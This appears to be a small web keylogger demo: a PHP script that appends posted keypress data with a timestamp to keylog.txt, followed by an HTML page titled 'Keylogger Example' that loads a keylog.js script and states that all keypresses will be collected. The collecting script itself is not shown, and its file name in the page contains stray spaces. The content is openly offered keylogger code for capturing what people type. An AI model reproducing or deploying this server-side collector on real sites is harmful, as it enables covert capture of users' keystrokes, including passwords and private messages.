<?php
$file = fopen('keylog.txt', 'a+');
fwrite($file, date("Y-m-d H:i:s") . PHP_EOL . $_POST['presses'] . PHP_EOL);
fclose($file);
echo "OK";
?>
 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script src="keylo  g.js"></script>
 
<h1>Keylogger Example</h1>
<p>All keypresses will be collected!</p>
<input type="text"/>
<br><br>
<textarea></textarea>
</body>
</html>